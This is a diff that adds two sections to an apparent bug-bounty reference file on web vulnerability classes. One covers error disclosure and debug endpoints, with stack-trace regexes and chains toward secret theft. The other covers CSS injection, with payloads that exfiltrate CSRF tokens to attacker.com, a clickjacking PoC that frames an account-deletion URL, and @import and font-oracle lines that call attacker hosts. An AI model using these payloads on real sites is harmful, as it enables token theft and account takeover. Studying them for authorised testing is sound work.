@@ -1,9 +1,9 @@
 ---
 name: web2-vuln-classes
-description: Complete reference for 20 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS, SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10 agentic framework), API misconfig (mass assignment, JWT attacks, prototype pollution, CORS), ATO taxonomy (9 paths), SSTI (Jinja2/Twig/Freemarker/ERB/Spring), subdomain takeover, cloud/infra misconfigs, HTTP smuggling (CL.TE/TE.CL/H2.CL), cache poisoning, MFA bypass (7 patterns), SAML attacks (XSW/comment injection/signature stripping). Use when hunting a specific vuln class or studying what makes bugs pay.
+description: Complete reference for 22 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS, SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10 agentic framework), API misconfig (mass assignment, JWT attacks, prototype pollution, CORS), ATO taxonomy (9 paths), SSTI (Jinja2/Twig/Freemarker/ERB/Spring), subdomain takeover, cloud/infra misconfigs, HTTP smuggling (CL.TE/TE.CL/H2.CL), cache poisoning, MFA bypass (7 patterns), SAML attacks (XSW/comment injection/signature stripping), error disclosure / debug endpoints (stack trace regex per framework, chain templates), CSS injection (attribute-selector exfiltration, opacity clickjacking, @import). Use when hunting a specific vuln class or studying what makes bugs pay.
 ---
 
-# WEB2 BUG CLASSES — 18 Classes
+# WEB2 BUG CLASSES — 22 Classes
 
 Root cause, pattern, bypass table, chaining opportunity, real paid examples.
 
@@ -848,4 +848,150 @@ Sig stripping    = Critical (ATO any user)
 Comment injection = High (ATO admin)
 XXE in assertion = High (file read / SSRF)
 NameID manip     = Medium/High (depends on what NameID maps to)
+```
+
+---
+
+## 21. ERROR DISCLOSURE / DEBUG ENDPOINTS
+> Stack traces and framework debug surfaces — chain into secret extraction → ATO.
+
+### Framework Stack Trace Regex
+Grep response bodies (4xx and 5xx) for these — each implies a known exploitation playbook.
+
+```
+Django           Traceback \(most recent call last\)              → check DEBUG=True page → DB creds, SECRET_KEY → forge sessions
+Spring/Java      at \S+\(.*\.java:\d+\)|NestedServletException   → look for /actuator/* → /env → secrets / JWT key
+Symfony (PHP)    Whoops\\Run|\\\\Symfony\\\\.*\\\\Exception        → check /_profiler/ → request tokens → replay/auth bypass
+Rails            /app/controllers/|/gems/.*\.rb:\d+:in            → check dev mode → web-console RCE
+ASP.NET (YSOD)   \[\w+Exception:|Server Error in '.+' Application  → check trace.axd, elmah.axd → request replay
+PHP              (Warning|Fatal error|Notice):.*on line \d+        → path disclosure → LFI / config leak
+Node.js          Error: .*\n\s+at \S+ \(.*:\d+:\d+\)               → look for /__debug__/, source maps
+Go               goroutine \d+ \[running\]:|runtime/panic\.go      → expvar at /debug/vars, /debug/pprof
+```
+
+### Triggering Stack Traces (when no debug endpoint exposed)
+Inject malformed input on existing parameters — many apps still leak traces on unexpected types.
+
+```
+Numeric ID → string         /api/user/abc                       → ORM error with column names
+Numeric ID → negative       /api/user/-1                        → unhandled signed overflow
+Numeric ID → boundary       /api/user/9999999999999999999       → int overflow / type cast error
+JSON null where object      {"user": null}                      → NullPointerException
+JSON array where object     {"user": []}                        → ClassCastException
+Truncated/malformed JSON    {"user":                            → parser stack trace
+%00 in path                 /api/user/1%00.json                 → path normalisation difference
+Oversized page param        ?page=99999999                      → OOM or query timeout trace
+Wrong content-type          POST JSON as Content-Type: text/xml → XML parser dump
+Empty multipart boundary    Content-Type: multipart/form-data;  → Busboy / Undici stack trace
+Unicode normalisation       /api/user/admin​               → diff path between sanitiser and DB
+```
+
+### Chains That Pay
+```
+Stack trace -> framework version -> public CVE -> RCE             High–Critical
+/actuator/env -> spring.datasource.password -> DB access           Critical
+/actuator/env -> JWT signing key -> forge admin token              Critical (ATO)
+/actuator/heapdump -> grep secrets -> AWS access keys              Critical
+/_profiler/ -> capture victim session token -> account takeover    Critical
+/_next/data/ -> SSR-rendered API responses -> IDOR without auth    High
+DEBUG=True (Django) -> SECRET_KEY leak -> session forgery          Critical
+PHP path disclosure -> LFI parameter discovered earlier -> RCE     Critical
+Stack trace alone (no chain)                                       Low → likely N/A
+```
+
+### Triage
+```
+Secrets visible (DB creds, JWT key, API keys)        = Critical (chain to ATO/data)
+Framework version + public CVE matching              = High–Critical (verify with PoC)
+PII / internal IP / hostname in stack trace          = Medium (information disclosure)
+Path disclosure only (no secrets)                    = Low/Info (chain to LFI to upgrade)
+"Yellow page" / "Internal Server Error" generic      = N/A — no signal
+```
+
+---
+
+## 22. CSS INJECTION
+> CSS can exfil data and hijack clicks **without executing JavaScript**. Because CSP targets script execution — not stylesheet rules — CSS injection often survives on sites with strict CSP.
+
+### Where this appears
+| Context | Example targets |
+|---|---|
+| User-customizable CSS / themes | Tumblr, Medium custom CSS, Slack themes, Notion embeds, phpBB themes |
+| HTML email rendering | Gmail, Outlook, Mailchimp (real CVEs across all three) |
+| Forum / CMS rich text | WordPress posts, Confluence custom CSS, MediaWiki user CSS |
+| HTML-to-PDF pipelines | Headless Chrome rendering invoices/reports (CSS runs server-side) |
+| Server-side template injection side-effect | SSTI rendered into `<style>` block; user-controlled `style` attributes |
+| Markdown engines | Some allow `<style>` or `style=` attributes by default |
+
+### Attribute Selector Exfiltration
+Steal a CSRF token / API key / password reset token one character at a time. **Works with no JavaScript, survives strict CSP.**
+
+```css
+/* Round 1 — leak first character of token */
+input[name="csrf"][value^="a"] { background: url(//attacker.com/?c=a) }
+input[name="csrf"][value^="b"] { background: url(//attacker.com/?c=b) }
+input[name="csrf"][value^="c"] { background: url(//attacker.com/?c=c) }
+```
+
+**Mechanics:**
+1. Victim loads page containing `<input value="abc123def456">`
+2. Browser evaluates all 62 rules — **only one matches** (`value^="a"`)
+3. That match triggers `background: url(...)` → browser fires `GET //attacker.com/?c=a`
+4. Attacker's server log: "first character = `a`"
+5. Round 2: attacker rewrites CSS with `value^="aa"`, `value^="ab"`, ..., `value^="az"`
+6. Token of length N is fully extracted in N rounds
+
+**Single-character variants:**
+- `[value^="X"]` — prefix
+- `[value$="X"]` — suffix
+- `[value*="X"]` — substring
+
+### Opacity Clickjacking — Working PoC Template
+```html
+<!-- Hosted on attacker.com -->
+<button style="position:absolute;top:50px;left:50px;z-index:1;">Click to win iPhone!</button>
+<iframe src="https://target.com/account/delete?confirm=1"
+        style="position:absolute;top:50px;left:50px;
+               width:200px;height:50px;
+               opacity:0;z-index:9999;"></iframe>
+```
+
+The transparent iframe sits *over* the visible button. Victim sees "win iPhone" and clicks — actually clicks the delete-account confirm button on target.com under their logged-in session.
+
+**Verification checklist:**
+- [ ] X-Frame-Options not set OR set to `ALLOWALL`
+- [ ] CSP `frame-ancestors` not set OR includes wildcard / attacker domain
+- [ ] Target action requires only a click (no second confirmation)
+- [ ] Logged-in cookies are `SameSite=None` or omitted → cross-site iframe still authenticated
+
+### `@import` — Attacker-Controlled Stylesheet
+If a sanitizer strips `<script>` but allows `@import` or `url()` in user CSS:
+```css
+@import url(https://attacker.com/evil.css);
+```
+Now attacker controls **all** styling on the page: overlay phishing forms, hide warning banners, reposition cancel/confirm buttons.
+
+### Font-Based Character Oracle
+Use `unicode-range` in `@font-face` to detect whether a specific Unicode character is present:
+```css
+@font-face { font-family: x; src: url(//attacker.com/?d=5);
+             unicode-range: U+0035; }  /* fires only if "5" rendered on page */
+```
+
+### Chains That Pay
+```
+Attribute selector + CSRF token form                       → token exfil → CSRF on sensitive action   High
+Opacity clickjacking + transfer/delete/email-change        → account compromise                       Medium/High
+@import + phishing form overlay                            → credential theft                         High
+Font side-channel + short rendered data (PIN/OTP)          → character oracle                        Low–Medium
+CSS injection with no exfil/overlay path                   → N/A standalone
+```
+
+### Triage
+```
+Attribute selector exfils real sensitive data (token/password/SSN)     = High
+@import or full stylesheet control + working phishing PoC              = High
+Opacity overlay + completes a sensitive action in PoC                  = Medium/High
+Only cosmetic CSS allowed (no url()/@import) + no exfil path           = N/A
+CSS in HTML email with rendered attacker styles                        = Medium (case-by-case)
 ```
